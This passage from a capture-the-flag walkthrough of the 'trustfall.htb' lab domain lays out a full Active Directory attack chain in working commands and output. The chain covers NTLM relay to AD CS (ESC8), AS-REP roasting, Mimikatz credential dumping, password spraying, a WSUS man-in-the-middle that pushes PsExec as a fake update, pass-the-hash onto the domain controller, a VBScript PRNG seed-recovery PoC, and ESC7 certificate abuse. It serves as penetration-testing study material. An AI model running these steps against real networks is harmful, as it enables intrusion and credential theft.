3. Disable the local firewall so traffic can be forwarded back to the attacker box.
4. Forward captured RDP traffic over the ligolo tunnel to Responder/ntlmrelayx running on the attacker machine.

```bash
ip addr add 192.168.1.37/24 dev eth0
```

A throwaway Python listener on 3389 confirmed connections were indeed arriving from WS01:

```bash
python3 -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 3389)); s.listen(5)
print("[+] Listening on 3389...")
while True:
    c, addr = s.accept()
    print(f"[+] Connection from {addr}")
    c.close()
'
```

```
[+] Connection from ('192.168.1.64', 49774)
[+] Connection from ('192.168.1.64', 49775)
...
```

Firewall disabled to allow the forward:

```bash
ufw status
ufw disable
```

The connections were then forwarded over the tunnel to the attacker's real listener:

```bash
./socat TCP-LISTEN:3389,reuseaddr,fork TCP:10.10.xx.xx:3389 &
```

On the attacker box, **Responder** was started to catch and relay the incoming RDP NTLM authentication:

```bash
sudo responder -I tun0 -v
```

```
[RDP] NTLMv2-SSP Client   : 10.129.xx.xx
[RDP] NTLMv2-SSP Username : WS01\david.m
[RDP] NTLMv2-SSP Hash     : david.m::WS01:[REDACTED NTLMv2 HASH]
```

**Proof this was worth checking / cracking attempt:** the captured NTLMv2 hash was thrown at rockyou to see if it was a weak/reused password:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
0g 0:00:00:07 DONE (2026-09-17 03:51) 0g/s 2017Kp/s
Session completed.
```

**0 cracked** — david.m's password is not in rockyou, so it isn't simply guessable. However, the captured NTLMv2 login doesn't need to be cracked offline at all — it can be **relayed live** instead, which is the far more powerful move here.

---

## 17. NTLM Relay to AD CS Web Enrollment (ESC8-style)

Since Impacket's `ntlmrelayx` (v0.13.1+) supports relaying to the AD CS HTTP enrollment endpoint (`certsrv/certfnsh.asp`), the captured RDP-borne NTLM auth from david.m could be relayed straight into requesting a client certificate on his behalf — this only works because AD CS Web Enrollment does not require Extended Protection for Authentication (EPA)/channel binding, a classic **ESC8** condition.

```bash
impacket-ntlmrelayx -t https://192.168.1.32/certsrv/certfnsh.asp --adcs --template User -smb2support -debug
```

First attempt hit a library incompatibility:

```
AttributeError: module 'OpenSSL.crypto' has no attribute 'X509Req'
```

Fixed by pinning a compatible `pyOpenSSL` version inside impacket's virtualenv:

```bash
python3 -m venv start
source start/bin/activate
pipx inject impacket pyOpenSSL==22.1.0 --force
```

Re-run:

```bash
impacket-ntlmrelayx -t https://192.168.1.32/certsrv/certfnsh.asp --adcs --template User -smb2support
```

```
[*] (RDP): New connection from 10.129.xx.xx:50016
[*] HTTP server returned error code 200, treating as a successful login
[*] (RDP): Authenticating connection from WS01/DAVID.M@10.129.xx.xx against https://192.168.1.32 SUCCEED [1]
[*] https://WS01/DAVID.M@192.168.1.32 [1] -> Using template name: User
[*] https://WS01/DAVID.M@192.168.1.32 [1] -> CSR generated!
[*] https://WS01/DAVID.M@192.168.1.32 [1] -> GOT CERTIFICATE! ID 10
[*] https://WS01/DAVID.M@192.168.1.32 [1] -> Writing PKCS#12 certificate to ./DAVID.M.pfx
```

A valid client authentication certificate for `david.m` was issued — entirely from a relayed RDP login, no password needed.

---

## 18. Authenticating as david.m & Running BloodHound

The certificate was used to request a Kerberos TGT via PKINIT, which also yields the account's NT hash for free:

```bash
certipy-ad auth -pfx DAVID.M.pfx -dc-ip 192.168.1.32
```

```
[*] Certificate identities:
[*]     SAN UPN: 'david.m@trustfall.htb'
[*]     Security Extension SID: 'S-1-5-21-321399640-1940743330-3713521093-5603'
[*] Got TGT
[*] Saving credential cache to 'david.m.ccache'
[*] Got hash for 'david.m@trustfall.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
```

The DC IP used for AD lookups was switched back to the HTB-provided target IP (both point at the same DC) and the ccache was exported for Kerberos-based tooling:

```bash
export KRB5CCNAME=david.m.ccache
```

Full BloodHound collection was run via Kerberos:

```bash
bloodhound-python -u david.m -d trustfall.htb -dc dc01.trustfall.htb -ns 10.129.xx.xx -c All --kerberos --dns-tcp -no-pass
```

```
INFO: Found 3 computers
INFO: Found 16 users
INFO: Found 63 groups
INFO: Found 5 gpos / 10 ous / 19 containers
INFO: Done in 02M 16S
```

Object-level write permissions for david.m were also checked directly with `bloodyAD`:

```bash
bloodyad -u david.m -d trustfall.htb -H dc01.trustfall.htb --dc-ip 10.129.xx.xx -k get writable
```

```
distinguishedName: CN=david.m,OU=Finance,...                 permission: WRITE
distinguishedName: CN=luis.mody,OU=Leadership,...             permission: WRITE
distinguishedName: DC=trustfall.htb,CN=MicrosoftDNS,...       permission: CREATE_CHILD
```

david.m has **WRITE** on the `luis.mody` object.

---

## 19. Abusing GenericWrite on the Leadership Group

Looking at `luis.mody`'s object showed his account was **disabled** (`ACCOUNTDISABLE`) and a member of the `Leadership` group:

```bash
bloodyad -u david.m -d trustfall.htb -H dc01.trustfall.htb --dc-ip 10.129.xx.xx -k get object \
  'CN=luis.mody,OU=Leadership,OU=TrustFall-Departements,OU=TrustFall-Office,DC=trustfall,DC=htb'
```

```
memberOf: CN=Leadership,OU=Leadership,...
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

A direct password reset was attempted first (simplest path) — but it failed because a low-privileged account can't overwrite a password blind via LDAP without the old one:

```bash
bloodyad -u david.m -d trustfall.htb -H dc01.trustfall.htb --dc-ip 10.129.xx.xx -k set password luis.mody 'NewStrongPassword!2026'
```

```
badldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.
```

Since david.m has write access to `luis.mody`, the account was instead **re-enabled** and then flagged for **AS-REP Roasting** by setting `DONT_REQ_PREAUTH` — this avoids needing a valid password at all:

```bash
bloodyad -u david.m -d trustfall.htb -H dc01.trustfall.htb --dc-ip 10.129.xx.xx -k remove uac luis.mody -f ACCOUNTDISABLE
```
```
[+] ['ACCOUNTDISABLE'] property flags removed from luis.mody's userAccountControl
```

```bash
bloodyad -u david.m -d trustfall.htb -H dc01.trustfall.htb --dc-ip 10.129.xx.xx -k add uac luis.mody -f DONT_REQ_PREAUTH
```
```
[+] ['DONT_REQ_PREAUTH'] property flags added to luis.mody's userAccountControl
```

---

## 20. AS-REP Roasting luis.mody

With Kerberos pre-authentication disabled for the account, its AS-REP (which contains a portion encrypted with a key derived from the account's password) could be requested with no credentials at all:

```bash
impacket-GetNPUsers trustfall.htb/luis.mody -dc-ip 10.129.xx.xx -no-pass
```

```
[*] Getting TGT for luis.mody
$krb5asrep$23$luis.mody@TRUSTFALL.HTB:[REDACTED AS-REP HASH]
```

---

## 21. Cracking the AS-REP Hash with a Targeted Wordlist

A generic rockyou attempt was tried first — and failed:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
0g 0:00:00:11 DONE
Session completed.
```

Remembering the documented company password pattern from the mail migration notes (`CompanyName + DEPARTMENT + FirstName + BirthYear + !`), the same targeted wordlist technique from Section 4 was reused — this time for `Luis` across a wider department list (including `LEADERSHIP`, matching his actual group):

```python
#!/usr/bin/env python3

names = ["Luis"]
departments = ["HR", "IT", "SALES", "MARKETING", "FINANCE", "SUPPORT", "LEGAL", "ADMIN", "OPERATIONS", "LEADERSHIP"]
years = range(1970, 2010)

with open("targeted_wordlist.txt", "w") as f:
   for name in names:
       for dept in departments:
           for year in years:
               f.write(f"TrustFall{dept}{name}{year}!\n")
```

```bash
python3 create_wordlist.py
john hash --wordlist=targeted_wordlist.txt
```

```
TrustFallLEADERSHIPLuis[REDACTED]! ($krb5asrep$23$luis.mody@TRUSTFALL.HTB)
1g 0:00:00:00 DONE (14.28g/s)
Session completed.
```

Cracked instantly — the same company-wide password convention leaked in Section 3 was reused for a Domain user account, months (in-game) after the "temporary" mail testing it was documented for.

---

## 22. Taking Over luis.mody & Abusing OU Permissions

With his cracked password, luis.mody's own password was rotated to a known value via Kerberos's native password-change protocol (`kpasswd`), since the cracked AS-REP password can be used to authenticate once and then change it cleanly:

```bash
cat /etc/krb5.conf
```
```
[libdefaults]
    default_realm = TRUSTFALL.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false

[realms]
    TRUSTFALL.HTB = {
        kdc = dc01.trustfall.htb
        admin_server = dc01.trustfall.htb
    }

[domain_realm]
    .trustfall.htb = TRUSTFALL.HTB
    trustfall.htb = TRUSTFALL.HTB

```

```bash
kpasswd luis.mody@TRUSTFALL.HTB
```
```
Password for luis.mody@TRUSTFALL.HTB: [cracked password]
Enter new password: [REDACTED]
Enter it again: [REDACTED]
Password changed.
```

Validated with NetExec:

```bash
nxc smb 10.129.xx.xx -u luis.mody -p '[REDACTED]'
```
```
SMB   10.129.xx.xx   445   DC01   [+] trustfall.htb\luis.mody:[REDACTED]
```

Checked what luis.mody can write to as a member of `Leadership`:

```bash
bloodyad -u luis.mody -p '[REDACTED]' -d trustfall.htb -H dc01.trustfall.htb --dc-ip 10.129.xx.xx get writable
```

```
distinguishedName: OU=TrustFall-Users,OU=TrustFall-Office,DC=trustfall,DC=htb
permission: CREATE_CHILD; WRITE
DACL: WRITE
```

BloodHound confirmed the chain: **luis.mody** → member of **Leadership** → has **GenericWrite/WriteDACL** on **TrustFall-Users OU** → which **contains** `jake.r` and `emma.williams`.

Since luis.mody can write the DACL of the whole `TrustFall-Users` OU, `impacket-dacledit` was used to grant **FullControl** over that OU to luis.mody himself:

```bash
impacket-dacledit -action write -rights FullControl -principal luis.mody \
  -target-dn 'OU=TrustFall-Users,OU=TrustFall-Office,DC=trustfall,DC=htb' \
  -inheritance 'trustfall.htb/luis.mody:[REDACTED]' -dc-ip 10.129.xx.xx
```

```
[*] DACL backed up to dacledit-20260917-173150.bak
[*] DACL modified successfully!
```

With FullControl inherited down onto the users inside that OU, `jake.r`'s password was reset directly over SAMR:

```bash
impacket-changepasswd 'jake.r@10.129.xx.xx' -altuser 'trustfall.htb/luis.mody' -altpass '[REDACTED]' \
  -newpass '[REDACTED]' -reset -protocol smb-samr
```

```
[*] Setting the password of Builtin\jake.r as trustfall.htb\luis.mody
[*] Password was changed successfully.
```

---

## 23. WinRM Access as jake.r on WS01

```bash
nxc smb 10.129.xx.xx -u jake.r -p '[REDACTED]'
```
```
SMB   10.129.xx.xx   445   DC01   [+] trustfall.htb\jake.r:[REDACTED]
```

```bash
nxc winrm 192.168.1.64 -u jake.r -p '[REDACTED]'
```
```
WINRM   192.168.1.64   5985   WS01   [+] trustfall.htb\jake.r:[REDACTED] (Pwn3d!)
```

```bash
evil-winrm -i 192.168.1.64 -u jake.r -p '[REDACTED]'
```

```
*Evil-WinRM* PS C:\Users\it.junior\Documents>
```

A quick directory tree of the logged-in profile (`it.junior`, interesting — jake.r is landing in another user's profile context) showed a downloaded WinSCP installer under `Downloads`, which prompted a look at WinSCP's saved-session configuration.

---

## 24. Finding MinIO Credentials in a WinSCP Config File

```powershell
type WinSCP.ini
```

The config revealed a **saved MinIO (S3-compatible object storage) session** with an encrypted, saved password:

```ini
[Configuration\CDCache]
minioadmin@192.168.1.32:9000=41

[Configuration]
JumpList=minioadmin@minio-srv01.trustfall.htb

...

[Sessions\minioadmin@minio-srv01.trustfall.htb]
HostName=192.168.1.32
PortNumber=9000
UserName=minioadmin
FSProtocol=7
Password=[REDACTED WINSCP-ENCRYPTED BLOB]
```

WinSCP encrypts saved passwords with a reversible scheme keyed off the hostname/username/port, so a small decoding utility (`winscppasswd.exe`) recovered the plaintext:

```
winscppasswd.exe 192.168.1.32 minioadmin [REDACTED-BLOB]
```

```
[REDACTED — MinIO password recovered]
```

---

## 25. Pulling a Credential Backup from MinIO

The official MinIO client (`mc`) was downloaded to the pivot box:

```bash
wget "https://dl.min.io/aistor/mc/release/linux-amd64/mc"
./mc
```

An alias was configured with the recovered credentials:

```bash
./mc alias set minio http://192.168.1.32:9000 minioadmin '[REDACTED]'
```

First attempt failed on a clock-skew check (expected, since the pivot box's clock drifted from the internal network):

```
Unable to initialize new alias from the provided credentials. The difference between the request time and the server's time is too large.
```

After syncing/retrying it succeeded:

```
Added `minio` successfully.
```

```bash
./mc ls minio
```
```
[2026-02-11 07:05:40 UTC]     0B it-backups-prod/
```

```bash
./mc ls minio/it-backups-prod --recursive
```
```
[2026-02-22 02:14:33 UTC]   359B STANDARD README.txt
[2026-02-11 07:05:47 UTC]   896B STANDARD credbackup_2023.crd
```

```bash
./mc cat minio/it-backups-prod/README.txt
```

```
Backup Note – October 2023

This file (credbackup_2023.crd) contains exported Windows credentials
from my workstation before reinstallation.

Export password:
[REDACTED]

Do NOT delete until new system is fully configured and verified.

TODO:
- Re-import credentials after domain join
- Remove backup from storage once confirmed working
```

This is a genuine Windows **Credential Manager export** (`.crd`), protected by an export password that was, again, left right next to the file.

```bash
./mc cp minio/it-backups-prod/credbackup_2023.crd .
```

---

## 26. Decrypting the Credential Backup with Mimikatz

To decrypt an exported Windows Credential Manager backup properly, you need a **Windows** machine, **local admin** rights, and **LSA protection disabled** (some backup formats rely on re-importing into Credential Manager, which then gets read straight out of LSASS). This was done on a machine reachable with admin rights (`FS-EU-01`, reached via the admin token available at that point).

Workflow: import the `.crd` back into Windows Credential Manager using the recovered export password, then use Mimikatz to elevate and dump credentials straight from the LSA credential-manager cache rather than trying to parse the file format manually.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
-> Impersonated !
* Process Token : {...} FS-EU-01\Administrator ...
* Thread Token  : {...} NT AUTHORITY\SYSTEM ...

mimikatz # sekurlsa::credman
```

Buried among various machine/service logon sessions, the credential-manager dump revealed **four sets of reimported credentials**:

```
[00000000]
* Username : sql_svc
* Domain   : sqlsrv01.trustfall.htb
* Password : [REDACTED]

[00000001]
* Username : it.junior
* Domain   : ws02.trustfall.htb
* Password : [REDACTED]

[00000002]
* Username : sql_svc
* Domain   : sqlsrv02.trustfall.htb
* Password : [REDACTED]

[00000003]
* Username : it.junior
* Domain   : ws03.trustfall.htb
* Password : [REDACTED]
```

Two distinct `sql_svc` passwords (for two different "sqlsrv" hosts) and two identical `it.junior` passwords across `ws02`/`ws03` — all candidates for domain-account password reuse.

---

## 27. Password Reuse Check → sql_svc

Both usernames and all four recovered passwords were sprayed against the DC with `nxc`, using `--continue-on-success` to see every hit rather than stopping at the first:

```bash
nxc smb 10.129.xx.xx -u user.txt -p pass.txt --continue-on-success
```

```
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\sql_svc:[pw1]           STATUS_LOGON_FAILURE
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\it.junior:[pw1]         STATUS_LOGON_FAILURE
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\sql_svc:[pw2]           STATUS_LOGON_FAILURE
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\it.junior:[pw2]         STATUS_LOGON_FAILURE
SMB   10.129.xx.xx   445   DC01   [+] trustfall.htb\sql_svc:[REDACTED]
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\it.junior:[REDACTED]    STATUS_LOGON_FAILURE
```

**Result:** only the `sqlsrv02.trustfall.htb` password for `sql_svc` was valid on the domain account `sql_svc` — a real, provable password-reuse case: a service password saved in a backup credential export for one internal SQL host turned out to be the domain service account's actual current password.

---

## 28. BloodHound: sql_svc → IT Group → WebServer-HTTPS Template

BloodHound's edges for `sql_svc` showed:

```
sql_svc --AddMember--> IT
IT --Enroll--> WEBSERVER-HTTPS   (certificate template)
```

Meaning: `sql_svc` can add itself to the `IT` group, and `IT` has **Enroll** rights on a certificate template called `WebServer-HTTPS`. That template name — issuing certificates usable for TLS server authentication — combined with the fact that DC01 is running **WSUS** (confirmed below), is the setup for a known attack chain: obtain a certificate that can impersonate the WSUS server's TLS identity, then run a WSUS man-in-the-middle to push a "signed" malicious update to a client.

Reference used for this technique: [https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/)

WSUS-over-HTTPS was confirmed on WS01 via registry policy:

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
```

```
WUServer          REG_SZ    https://dc01.trustfall.htb:8531
WUStatusServer    REG_SZ    https://dc01.trustfall.htb:8531
```

---

## 29. Requesting a WebServer-HTTPS Certificate for the WSUS Attack

First, `sql_svc` added itself to the `IT` group to gain the template's Enroll right:

```bash
bloodyad -d trustfall.htb -u sql_svc -p '[REDACTED]' --host 10.129.xx.xx add groupMember "IT" "sql_svc"
```
```
[+] sql_svc added to IT
```

Then a certificate was requested from the `WebServer-HTTPS` template with a UPN of the domain controller's own hostname — the idea being to obtain a cert whose identity is usable to *stand in for* the WSUS server's TLS endpoint:

```bash
certipy req -u 'sql_svc@trustfall.htb' -p '[REDACTED]' -dc-ip 10.129.xx.xx -target 10.129.xx.xx \
  -ca 'trustfall-DC01-CA' -template 'WebServer-HTTPS' -upn 'dc01.trustfall.htb' -key-size 4096 -debug
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01.trustfall.htb'
[*] Certificate has no object SID
[*] Wrote certificate and private key to 'dc01.trustfall.htb.pfx'
```

The PFX was split into separate key/cert PEM files for use with the WSUS attack tooling:

```bash
certipy-ad cert -pfx dc01.trustfall.htb.pfx -nocert -o wsus.key
certipy-ad cert -pfx dc01.trustfall.htb.pfx -nokey -out wsus.crt
cat wsus.crt wsus.key > wsus.pem
```

---

## 30. Setting Up a Proxy on the Pivot Host

The `wsuks` tool (and installing it) needed outbound internet access from `ticket01`, which only has the internal network route. `socat` port-forwarding didn't cooperate for this, so **tinyproxy** was run on the attacker machine and the pivot box was pointed at it as an HTTP/HTTPS proxy for `apt`/`pip`:

Attacker side:

```bash
sed -i 's/^Port .*/Port 3142/' /etc/tinyproxy/tinyproxy.conf
echo "Allow 0.0.0.0/0" >> /etc/tinyproxy/tinyproxy.conf
tinyproxy -c /etc/tinyproxy/tinyproxy.conf
```

Pivot box (`ticket01`, as root):

```bash
cat > /etc/apt/apt.conf.d/01proxy << 'EOF'
Acquire::http::Proxy "http://10.10.xx.xx:3142";
Acquire::https::Proxy "http://10.10.xx.xx:3142";
EOF

echo 'export http_proxy=http://10.10.xx.xx:3142'  >> ~/.bashrc
echo 'export https_proxy=http://10.10.xx.xx:3142' >> ~/.bashrc
source ~/.bashrc
```

`wsuks` was then installed via `pipx`:

```bash
pipx install wsuks --system-site-packages
```

A Python 3.12 `argparse` compatibility bug (an `assert` mismatch when building the usage string) crashed the tool's help/argument parser on first run — worked around by patching the offending assertion in the stdlib module directly:

```bash
sed -i 's/assert .* == opt_usage/pass  # py312 patch/' /usr/lib/python3.12/argparse.py
```

`PsExec64.exe` (needed by `wsuks` to push a command through the fake update) was also fetched via the same proxy:

```bash
wget https://live.sysinternals.com/PsExec64.exe
```

---

## 31. WSUS MITM Attack (wsuks) → Local Admin on WS01

The firewall on `ticket01` was disabled (needed for the ARP spoofing / raw traffic used by the attack), and a NAT rule was added so traffic destined for the real DC's WSUS port gets redirected to the attacker-controlled fake WSUS server:

```bash
ufw disable
echo "192.168.1.32 dc01.trustfall.htb" >> /etc/hosts

iptables -t nat -A PREROUTING -p tcp -d 192.168.1.32 --dport 8531 \
  -j DNAT --to-destination 192.168.1.130:8531
```

`wsuks` was then run against WS01, using the forged `WebServer-HTTPS` certificate as the TLS identity for the rogue WSUS server, ARP-spoofing WS01 into believing the attacker's host is `192.168.1.32` (the real DC), and shipping `PsExec64.exe` as a fake, "trusted" update package that adds `jake.r` to the local Administrators group:

```bash
wsuks \
  -t 192.168.1.64 \
  --WSUS-Server dc01.trustfall.htb \
  --tls-cert /root/wsus.pem \
  -u jake.r \
  -d trustfall.htb \
  -I eth0 \
  -e /root/PsExec64.exe
```

```
[+] Command to execute:
PsExec64.exe /accepteula /s powershell.exe "Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member trustfall.htb\jake.r;"
[*] WSUS Server specified manually: 192.168.1.32:8531
[*] Starting ARP spoofing for target 192.168.1.64 and spoofing IP address 192.168.1.32
[*] Using TLS certificate '/root/wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 192.168.1.130:8531...
[*] Serving executable as KB: 9939338
```

On the existing WinRM session as jake.r, the client-side update check was manually triggered to force WS01 to poll for updates immediately rather than waiting for its normal schedule:

```powershell
wuauclt.exe /detectnow /reportnow
```

The rogue WSUS server log showed the full sequence — authentication, sync, and finally the client pulling down and executing the "update":

```
[+] Received POST /ClientWebService/client.asmx SOAP Action: ".../SyncUpdates"
[+] Received GET /1903005b-5e8c-4181-95d2-41956e8f924c/PsExec64.exe
```

Confirmed:

```powershell
net localgroup administrators
```

```
Members
-------------------------------------------------------------------------------
Administrator
tom.k-local
TRUSTFALL\Domain Admins
TRUSTFALL\jake.r
ws01
```

`jake.r` is now a **local administrator on WS01**. A fresh WinRM session was started to pick up the new group membership.

---

## 32. User Flag & Dumping the Local SAM/LSA Secrets

```powershell
type user.txt
```
```
[REDACTED — USER FLAG]
```

With local admin, the SAM/SECURITY/SYSTEM hives were exported and downloaded for offline processing:

```powershell
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
reg save HKLM\SYSTEM system.hiv
download sam.hiv
download security.hiv
download system.hiv
```

```bash
impacket-secretsdump -sam sam.hiv -security security.hiv -system system.hiv LOCAL
```

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:...:[REDACTED]:::
Guest:501:...:...:::
WDAGUtilityAccount:504:...:...:::
ws01:1001:...:[REDACTED]:::
tom.k-local:1004:...:[REDACTED]:::

[*] Dumping cached domain logon information (domain/username:hash)
TRUSTFALL.HTB/emma.williams:$DCC2$10240#emma.williams#[REDACTED]
TRUSTFALL.HTB/it.junior:$DCC2$10240#it.junior#[REDACTED]
TRUSTFALL.HTB/Administrator:$DCC2$10240#Administrator#[REDACTED]

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
TRUSTFALL\WS01$:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[*] DefaultPassword
(Unknown User):[REDACTED]
[*] DPAPI_SYSTEM
dpapi_machinekey:0x[REDACTED]
dpapi_userkey:0x[REDACTED]
[*] NL$KM
NL$KM:[REDACTED]
```

---

## 33. Local Hash Reuse → tom.k on the Domain Controller

The dump revealed a local account `tom.k-local` on WS01. There's also a `tom.k` account on the **domain**. Password-reuse (or in this case, identical account/hash reuse between the "local" mirror account and the real domain account) was checked directly:

```bash
nxc smb 10.129.xx.xx -u tom.k -H [REDACTED-NT-HASH]
```
```
SMB   10.129.xx.xx   445   DC01   [+] trustfall.htb\tom.k:[REDACTED]
```

```bash
nxc winrm 10.129.xx.xx -u tom.k -H [REDACTED-NT-HASH]
```
```
WINRM   10.129.xx.xx   5985   DC01   [+] trustfall.htb\tom.k:[REDACTED] (Pwn3d!)
```

**Confirmed:** `tom.k-local`'s NT hash on WS01 is the *same* as domain user `tom.k`'s hash on the DC. This is a pass-the-hash straight onto the Domain Controller itself:

```bash
evil-winrm -i 10.129.xx.xx -u tom.k -H [REDACTED-NT-HASH]
```
```
*Evil-WinRM* PS C:\Users\tom.k\Documents>
```

---

## 34. Finding a Weak Password-Reset Script (Reset-User.vbs)

Poking around `tom.k`'s accessible filesystem on the DC turned up an admin scripting folder:

```powershell
cd C:\Scripts\AdminTools
dir
```

```
password_reset.log
Reset-User.vbs
```

`Reset-User.vbs` is a legacy VBScript used by IT to reset a user's AD password to a freshly generated random token:

```vbscript
Dim TOKEN_LENGTH
TOKEN_LENGTH = 32
Dim TOKEN_CHARS
TOKEN_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789()*&^%$#@!"

Function GenerateToken(chars, length)
    Dim result, i, pos, charsLen
    charsLen = Len(chars)
    Randomize Timer
    For i = 1 To length
        pos = Int((Rnd * charsLen) + 1)
        result = result & Mid(chars, pos, 1)
    Next
    GenerateToken = result
End Function

Sub ResetUserPassword(userName, newPassword)
    Dim userDN, userObj
    userDN = "LDAP://CN=" & userName & ",CN=Users,DC=trustfall,DC=htb"
    Set userObj = GetObject(userDN)
    userObj.SetPassword newPassword
    userObj.SetInfo
End Sub
```

**The complexity here, explained simply:** VBScript's `Randomize Timer` seeds the pseudo-random number generator using the current system time (down to fractions of a second, via `Timer`, which returns seconds-since-midnight as a floating point number). VBScript's `Rnd`/`Randomize` pair is **not cryptographically secure** — given the *same* seed value, `Rnd` always produces the *exact same* sequence of "random" numbers. So if an attacker knows (even approximately) *when* the script ran, they can regenerate the same 32-character "random" token it produced.

`password_reset.log` confirmed this script has been run for real accounts, and gave exact timestamps to target:

```
[2/12/2026 12:07:07 AM] Password reset started by Administrator for user aaron.b
[2/12/2026 12:07:07 AM] ERROR resetting password for aaron.b:
[2/12/2026 12:07:57 AM] Password reset started by Administrator for user aaron.b
[2/12/2026 12:07:57 AM] Password reset completed successfully for aaron.b
[2/13/2026 4:21:39 PM] Password reset completed successfully for aaron.b
[2/17/2026 2:21:01 AM] Password reset completed successfully for aaron.b
```

The last successful reset for `aaron.b` happened at **2/17/2026 2:21:01 AM**.

Background reading on this exact class of bug (predictable VBScript `Randomize`/`Rnd` seeding for "secure" token generation): [https://blog.doyensec.com/2025/09/25/yet-another-random-story.html](https://blog.doyensec.com/2025/09/25/yet-another-random-story.html)

---

## 35. Reconstructing the VBScript `Randomize` Seed

A small proof-of-concept VBScript was written that takes a seed value on the command line and regenerates the token exactly the way the real script would, given that seed:

```vbscript
Option Explicit
If WScript.Arguments.Count < 1 Then
    WScript.Echo "Usage: cscript poc.vbs <seed>"
    WScript.Quit(1)
End If
Dim seedToTest
seedToTest = WScript.Arguments(0)
Dim TOKEN_CHARS, TOKEN_LENGTH
TOKEN_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789()*&^%$#@!"
TOKEN_LENGTH = 32
WScript.Echo GenerateToken(TOKEN_CHARS, TOKEN_LENGTH, seedToTest)

Function GenerateToken(chars, n, seed)
    Dim result, pos, i, charsLen
    charsLen = Len(chars)
    For i = 1 To n
        Randomize seed
        pos = Int((Rnd * charsLen) + 1)
        result = result & Mid(chars, pos, 1)
    Next
    GenerateToken = result
End Function
```

Uploaded to the DC over the existing WinRM session:

```
upload poc.vbs
```

A PowerShell loop then regenerated candidate seed values for every 1/64th of a second in a ±1-second window around the known reset timestamp (`02:21:00`–`02:21:02`), converting each timestamp into the same `float`-based `Timer()` value VBScript would have used, and running the PoC script once per candidate seed:

```powershell
$startClock = "02:21:00"
$endClock   = "02:21:02"
$tick       = 1.0/64.0

function Get-VbsSeed {
    param([double]$secs)
    $bytes = [BitConverter]::GetBytes([float]$secs)
    $dbl   = [BitConverter]::ToDouble(([byte[]](0,0,0,0) + $bytes), 0)
    return $dbl
}

function ToSeconds {
    param([string]$clock)
    $t = [datetime]::ParseExact($clock, "HH:mm:ss", $null)
    return $t.Hour*3600 + $t.Minute*60 + $t.Second
}

$start  = ToSeconds $startClock
$end    = ToSeconds $endClock
$val    = $start
$tokens = New-Object System.Collections.Generic.HashSet[string]

while ($val -le $end) {
    $seed  = Get-VbsSeed $val
    $token = (cscript //nologo poc.vbs $seed).Trim()
    if ($token.Length -eq 32) { [void]$tokens.Add($token) }
    $val += $tick
}

$tokens | Out-File -Encoding ASCII candidates.txt
Write-Host "Generated $($tokens.Count) unique candidate tokens"
```

```
Generated 129 unique candidate tokens
```

This produced a **129-entry** password wordlist — tiny, but each candidate is a *plausible exact match* for the real reset password, rather than a guess.

---

## 36. Cracking aaron.b's Password from Regenerated Candidates

```bash
nxc smb 10.129.xx.xx -u aaron.b -p candidates.txt
```

```
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\aaron.b:[candidate]   STATUS_LOGON_FAILURE
SMB   10.129.xx.xx   445   DC01   [-] trustfall.htb\aaron.b:[candidate]   STATUS_LOGON_FAILURE
...
SMB   10.129.xx.xx   445   DC01   [+] trustfall.htb\aaron.b:[REDACTED]
```

One of the 129 regenerated tokens matched exactly — confirming the timing-based reconstruction of the VBScript PRNG seed was correct.

BloodHound showed the payoff for this account: **aaron.b** is a member of **PKI Managers**, which has **ManageCA** rights on `trustfall-DC01-CA` — a classic **ESC7** privilege escalation path against Active Directory Certificate Services.

---

## 37. ESC7 — Abusing ManageCA on the Enterprise CA

**ESC7, explained simply:** if an account has "Manage CA" rights on the certificate authority itself, it can perform CA-administrator actions like enabling additional certificate templates for issuance, or manually approving ("issuing") a certificate request that the CA would otherwise deny. Combined with a template that allows specifying a Subject Alternative Name freely (like the built-in `SubCA` template), this lets an attacker request a certificate *claiming to be* Domain Administrator, get the request denied by template permissions, then use their CA-manager rights to force-issue that denied request anyway.

Step 1 — enable the `SubCA` template for issuance on the CA (normally not offered for regular enrollment):

```bash
certipy ca -u 'aaron.b@trustfall.htb' -p '[REDACTED]' -ca 'trustfall-DC01-CA' -dc-ip 10.129.xx.xx -enable-template SubCA
```
```
[*] Successfully enabled 'SubCA' on 'trustfall-DC01-CA'
```

Step 2 — request a certificate from that template, with the Subject Alternative Name set to `administrator@trustfall.htb`:

```bash
certipy req -ca 'trustfall-DC01-CA' -username aaron.b@trustfall.htb -p '[REDACTED]' -dc-ip 10.129.xx.xx \
  -target-ip 10.129.xx.xx -template SubCA -upn administrator@trustfall.htb
```

As expected, aaron.b doesn't have Enroll rights on `SubCA`, so this is denied — but the request ID is captured for the next step:

```
[*] Request ID is 12
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED
Would you like to save the private key? (y/N): y
[*] Saving private key to '12.key'
